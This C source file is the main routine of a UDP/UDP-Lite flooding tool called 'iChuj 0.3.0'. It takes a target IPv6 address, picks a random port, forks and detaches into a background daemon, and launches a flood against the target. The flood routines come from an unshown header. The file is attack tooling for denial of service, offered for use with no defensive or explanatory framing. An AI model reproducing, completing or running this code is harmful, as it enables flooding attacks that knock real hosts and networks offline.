#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

//random seed generator
#include <time.h>

//isinteger()
#include <ctype.h>

//error handling
#include <error.h>

//sockets
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//umask()
#include <sys/types.h>
#include <sys/stat.h>

#include "main.h"

const char* name = "iChuj 0.3.0\n";

int fd, forkpid;
char pid[20];

void usage(char *pname){
	printf("%s",name);
	printf("Usage: %s udp/udplite IPv6\n", pname);
	exit(EXIT_FAILURE);
}

int main(int argc, char **argv)
{
	struct sockaddr_in6 sin;
	int port;


  //Prepare startup parameters
	if(argc < 3 )
		usage(argv[0] );

	srand((unsigned int)time(NULL));
	port = rand() % 65535;

  printf("%s",name);

  if(inet_pton(AF_INET6, argv[2], sin.sin6_addr.s6_addr) != 1){
    perror("Bad IPv6\n");
    exit(EXIT_FAILURE);
  }

	sin.sin6_family=AF_INET6;
	sin.sin6_port=htons(port);
  
  forkpid=fork();
	if(forkpid==-1){
	  perror("Failed to fork process\n");
    exit(EXIT_FAILURE); 
	}else if(forkpid!=0){
	  printf("PORT: %i\nPID: %i\n",port,forkpid);
	  exit(EXIT_SUCCESS);
	}
	setsid();
	umask(0);

  if(!strcmp(argv[1], "udp"))
    flood_udp(sin);
  else if(!strcmp(argv[1], "udplite"))
    flood_udplite(sin);
  else {
    perror("Unknown flood method\n");
    exit(EXIT_FAILURE);
  }

  return EXIT_SUCCESS;

}
